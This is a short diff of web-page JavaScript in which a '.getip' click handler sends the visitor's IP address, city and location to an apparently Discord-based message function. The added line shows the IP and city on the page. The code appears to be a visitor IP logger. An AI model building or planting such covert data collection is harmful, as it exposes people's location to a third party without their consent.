@@ -30,5 +30,6 @@ $(".getip").on("click", function(){
   
 
   discord_message(web, "ip found " + ip + ", " + city + ", " + loc);
+  document.getElementById("stuff").innerHTML = ip + ", " + city;
 });
 });
